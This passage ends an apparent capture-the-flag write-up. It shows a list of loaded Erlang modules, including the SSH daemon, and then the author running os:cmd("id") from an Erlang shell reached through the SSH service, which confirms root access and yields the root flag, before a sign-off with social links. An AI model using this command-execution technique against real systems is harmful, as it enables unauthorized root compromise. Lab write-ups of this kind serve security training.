raw_file_io           /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/raw_file_io.beam
raw_file_io_list      /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/raw_file_io_list.beam
re                    /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/re.beam
rpc                   /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/rpc.beam
sets                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/sets.beam
shell                 /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/shell.beam
shell_default         /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/shell_default.beam
socket_registry       preloaded
sofs                  /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/sofs.beam
ssh                   /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh.beam
ssh_acceptor          /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_acceptor.beam
ssh_acceptor_sup      /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_acceptor_sup.beam
ssh_app               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_app.beam
ssh_auth              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_auth.beam
ssh_bits              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_bits.beam
ssh_channel_sup       /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_channel_sup.beam
ssh_cli               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_cli.beam
ssh_client_channel    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_client_channel.beam
ssh_connection        /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection.beam
ssh_connection_handl  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection_handler.beam
ssh_connection_sup    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_connection_sup.beam
ssh_dbg               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_dbg.beam
ssh_file              /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_file.beam
ssh_fsm_kexinit       /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_fsm_kexinit.beam
ssh_fsm_userauth_ser  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_fsm_userauth_server.beam
ssh_lib               /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_lib.beam
ssh_message           /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_message.beam
ssh_options           /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_options.beam
ssh_server_channel    /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_server_channel.beam
ssh_sftpd             /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_sftpd.beam
ssh_system_sup        /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_system_sup.beam
ssh_tcpip_forward_ac  /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_tcpip_forward_acceptor_sup.beam
ssh_transport         /usr/local/lib/erlang/lib/ssh-5.2.9/ebin/ssh_transport.beam
standard_error        /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/standard_error.beam
start_escript__escri  /usr/local/lib/erlang_login/start.escript
string                /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/string.beam
supervisor            /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/supervisor.beam
supervisor_bridge     /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/supervisor_bridge.beam
sys_core_alias        /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_alias.beam
sys_core_bsm          /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_bsm.beam
sys_core_fold         /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/sys_core_fold.beam
unicode               /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/unicode.beam
unicode_util          /usr/local/lib/erlang/lib/stdlib-6.2.2/ebin/unicode_util.beam
user_drv              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/user_drv.beam
user_sup              /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/user_sup.beam
v3_core               /usr/local/lib/erlang/lib/compiler-8.6.1/ebin/v3_core.beam
zlib                  preloaded
ok
```

We can use the `os` module to execute the command directly.

The Erlang shell `(ssh_runner@soulmate)3> os:cmd("id").` executed the `id` command and returned `"uid=0(root) gid=0(root) groups=0(root)\n"`, meaning the process is running as **root** (UID 0).

```bash
os                    /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*IMmevWXy78WYSdoZH-Xigw.png" alt=""><figcaption></figcaption></figure>

And Finally we successfully get root flag.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*xZrxe2dqGkDlnCS8dkV-kQ.png" alt=""><figcaption></figcaption></figure>

***

> _I hope you enjoyed this writeup! Happy Hacking :)_
>
> _Follow to me on Medium and be sure to turn on email notifications so you never miss out on my latest informative posts._

#### Follow me on below Social Media:

1. _**LinkedIn:**_ [_**Subhadip Sardar**_](http://linkedin.com/in/subhadip-sardar)
2. _**Twitter | X :**_ [_**@Mr\_SubhaDip03**_](https://x.com/Mr_SubhaDip03)
3. _**GitHub :**_ [_**SubhaDip003**_](https://github.com/SubhaDip003)
4. _**Check My TryHackMe Profile :**_ [_**TryHackMe | SubhaDip**_](https://tryhackme.com/r/p/SubhaDip)
5. _**Check My HackTheBox Profile:**_ [_**Hack The Box | SubhaDip03**_](https://app.hackthebox.com/profile/1658126)
